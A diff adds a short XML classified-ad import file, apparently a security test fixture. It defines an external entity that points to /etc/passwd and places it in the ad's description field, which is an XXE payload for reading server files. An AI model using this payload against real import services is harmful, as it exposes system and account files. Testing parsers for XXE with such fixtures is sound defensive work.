@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE ClassifiedAdImport [
+	<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<ClassifiedAdImport>
+    <ad>
+        <title>Harry Potter DVDs</title>
+        <description>&xxe;</description>
+        <price>45</price>
+    </ad>
+</ClassifiedAdImport>
